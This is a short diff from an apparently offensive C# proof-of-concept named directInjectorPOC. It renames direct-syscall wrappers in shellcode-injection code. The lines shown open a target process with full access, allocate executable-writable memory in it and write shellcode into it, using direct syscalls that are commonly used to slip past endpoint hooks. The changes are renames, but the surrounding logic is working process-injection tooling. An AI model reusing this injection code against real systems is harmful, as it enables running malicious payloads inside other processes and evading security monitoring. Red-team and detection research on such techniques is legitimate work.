@@ -98,7 +98,7 @@ namespace directInjectorPOC
 
             IntPtr bufferReal = IntPtr.Zero;
             IntPtr procHandle = IntPtr.Zero;
-            syscalls.ZwOpenProcess10(ref procHandle, nativeStructs.ProcessAccessFlags.All, new nativeStructs.OBJECT_ATTRIBUTES(), ref clientid, os);
+            syscalls.ZwOpenProcess(ref procHandle, nativeStructs.ProcessAccessFlags.All, new nativeStructs.OBJECT_ATTRIBUTES(), ref clientid, os);
             IntPtr remoteAddr = new IntPtr();
 
             switch (method)
@@ -107,12 +107,12 @@ namespace directInjectorPOC
                     Console.WriteLine("[+] Using ALLOCWRITE method to allocate our shellcode in the remote process");
                     UIntPtr sz = new UIntPtr(Convert.ToUInt32(shellcode.Length));
 
-                    syscalls.NtAllocateVirtualMemory10(procHandle, ref remoteAddr, new IntPtr(0), ref sz, nativeStructs.MEM_COMMIT | nativeStructs.MEM_RESERVE, nativeStructs.PAGE_EXECUTE_READWRITE, os);
+                    syscalls.NtAllocateVirtualMemory(procHandle, ref remoteAddr, new IntPtr(0), ref sz, nativeStructs.MEM_COMMIT | nativeStructs.MEM_RESERVE, nativeStructs.PAGE_EXECUTE_READWRITE, os);
 
                     IntPtr written = IntPtr.Zero;
                     IntPtr unmanagedPointer = Marshal.AllocHGlobal(shellcode.Length);
                     Marshal.Copy(shellcode, 0, unmanagedPointer, shellcode.Length);
-                    syscalls.ZwWriteVirtualMemory10(procHandle, ref remoteAddr, unmanagedPointer, Convert.ToUInt32(shellcode.Length), ref written, os);
+                    syscalls.ZwWriteVirtualMemory(procHandle, ref remoteAddr, unmanagedPointer, Convert.ToUInt32(shellcode.Length), ref written, os);
 
                     break;
                 case OPENSEC:
